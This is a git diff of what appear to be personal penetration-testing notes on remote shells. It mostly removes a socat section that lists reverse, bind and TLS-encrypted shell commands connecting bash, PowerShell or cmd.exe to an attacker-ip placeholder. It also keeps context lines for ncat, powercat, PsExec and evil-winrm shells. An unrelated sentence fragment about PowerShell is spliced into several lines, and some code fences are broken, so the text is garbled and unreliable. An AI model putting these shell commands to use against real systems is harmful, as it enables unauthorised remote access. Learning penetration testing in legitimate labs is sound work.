@@ -159,9 +159,7 @@ ncat -nlvp $PORT | tar xf -
 
 
 ## Socat 
-Socat is a command-line utility that establishes two bidirectional byte streams and transfers data between them. For penetration testing, it is similar to Netcat but has additional useful features. See the [[Socat-Cheatsheet]]
-
-[socat](https://linux.die.net/man/1/socat)
+[Socat](https://linux.die.net/man/1/socat) is a command-line utility that establishes two bidirectional byte streams and transfers data between them. For penetration testing, it is similar to Netcat but has additional useful features. See the [[Socat-Cheatsheet]]
 
 Socat requires:
 1. "-" to transfer data between STDIO and remote host
@@ -174,97 +172,6 @@ socat - TCP4:<remoteIP>:PORT
 socat TCP4-LISTEN:8080 STDOUT
 
 socat TCP4:ip:port EXEC:/bin/bash
-# Shells
-```
-
-### Reverse Shells
-Start a listener:
-```bash
-socat TCP-L:<PORT> -                                 # connect regardless with '-'
-socat -d -d TCP-LISTEN:8080 STDOUT                   # -d -d = increase verbosity of output#
-socat TCP4-LISTEN:8080,fork file:filename.txt,create 
-# create specifies that a new file will be created.
-# fork creates a child process once connection is made to the listener(multiple connections allowed)
-```
-Connect to reverse Shell:
-
-```bash
-socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
-socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
-```
-
-### Bind Shells
-Start a bind listener
-```bash
-socat TCP-L:<PORT> EXEC:"bash -li"
-socat TCP-L:<PORT> EXEC:powershell.exe,pipes
-```
-Connect to target regardless:
-```bash
-socat TCP:<TARGET-IP>:<TARGET-PORT> -
-```
-
-### Shell stablisation
-```bash
-socat TCP-L:<port> FILE:`tty`,raw,echo=0
-[CTRL+Z]
-stty raw -echo; fg 
-```
-
-Fixing terminal size
-```bash
-stty size
-stty -rows 48 -columns 120
-```
-
-### File transfers
-```bash
-socat TCP4-LISTEN:$PORT,fork file:$filename
-```
-
-### SPECIAL upload precompiled socat binary 
-```bash
-socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
-```
-1. pty, allocates a pseudoterminal on the target -- part of the stabation, knowing how to properly use PowerShell to achieve our goals is extremely important. Refer toilisation process
-1. stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
-1. sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
-1. setsid, creates the process in a new session
-1. sane, stabilises the terminal, attempting to "normalise" it
-
-### ENCRYPTING SHELLS
- 
-Generate a Certificate
-```bash
-openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
-openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
-```
-req indicates that this is a certificate signing request. 
--x509 specifies that we want an X.509 certificate
--newkey rsa:4096 creates a new certificate request and a new private key using RSA, with the key size(Optional sizes!) being 4096 bits. 
--days 365 shows that the validity of our certificate will be one year
--subj sets data, such as organization and country, via the command-line.
--nodes simplifies our command and does not encrypt the private key
--keyout `PRIVATE\_KEY` specifies the filename where we want toation, knowing how to properly use PowerShell to achieve our goals is extremely important. Refer to save our private key
--out CERTIFICATE specifies the filename to which we want to write the certificate request
-
-Merge the two files:
-```bash
-cat shell.key shell.crt > shell.pem
-```
-Setup reverse shell listener
-```bash
-socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - # verify=0 means dont bother trying to validate cert
-```
-The same for bind shell
-```ation, knowing how to properly use PowerShell to achieve our goals is extremely important. Refer to
-socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash # For windows after:" ,verify=0 EXEC='cmd.exe' "
-socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
-```bash
-Socat listener and conection on windows
-```bash
-socat.exe -d OPENSSL-LISTEN:5678,cert=<cert>, verify=0 STDOUT, bind=127.0.0.1
-socat.exe OPENSSL:127.0.0.1:5678, verify=0 EXEC=’cmd.exe
 ```
 
 ## SSH
@@ -350,7 +257,7 @@ powercat -l -p 1337 -e cmd.exe
 
 ## PsExec
 
-PsExec, a subtool of PsTools, itself a subset [[Sysinternals-Psexec]] from Sysinteral suite and can be used to establish remote Windows shells, see [[Sysinternals-Hub]] for more Systinternal tools and \*bit variants. It is also a `psexec.py` from Impacket check out :[[Impacket-Cheatsheet]]
+PsExec, a subtool of PsTools, itself a subset [[Sysinternals-Psexec]] from Sysinteral suite and can be used to establish remote Windows shells, see [[Sysinternals-Hub]] for more Systinternal tools and \*bit variants. It is also a `psexec.py` from Impacket check out: [[Impacket-Cheatsheet]]
 Version  2.32 and above require -i
 ```powershell
 psexec \\<remote-address> -u <username> -p <password> -i cmd # -i for interactive
@@ -361,7 +268,7 @@ psexec \\<remote-address> -u <username> -p <password> -i cmd # -i for interactiv
 [git](https://github.com/Hackplayers/evil-winrm)
 > The ultimate WinRM shell for hacking/pentesting
 
-HELP:
+HELP: but also for cheatsheet see [[Evil-winrm-Cheatsheet]]
 ```bash
 Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
     -S, --ssl                        Enable ssl
@@ -384,7 +291,7 @@ Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p P
     -h, --help                       Display this help message
 ```
 
-ation, knowing how to properly use PowerShell to achieve our goals is extremely important. Refer to## MSFvenom and Metasploit
+## MSFvenom and Metasploit
 Nice links:
 [The great g0tmi1k's payload creator](https://github.com/g0tmi1k/msfpc)
 [Common One Liners by Frizb](https://github.com/frizb/MSF-Venom-Cheatsheet)
